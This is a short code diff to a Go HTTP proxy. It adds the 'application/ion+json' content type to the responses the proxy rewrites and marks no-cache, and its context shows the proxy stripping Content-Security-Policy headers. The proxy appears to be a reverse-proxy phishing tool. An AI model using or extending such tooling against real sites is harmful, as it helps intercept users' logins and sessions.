@@ -120,7 +120,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
-		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json"},
 	}
 
 	p.Server = &http.Server{
@@ -911,6 +911,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
+			
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
@@ -1218,7 +1219,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
+			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json", "application/ion+json"}) {
 				resp.Header.Set("Cache-Control", "no-cache, no-store")
 			}
 
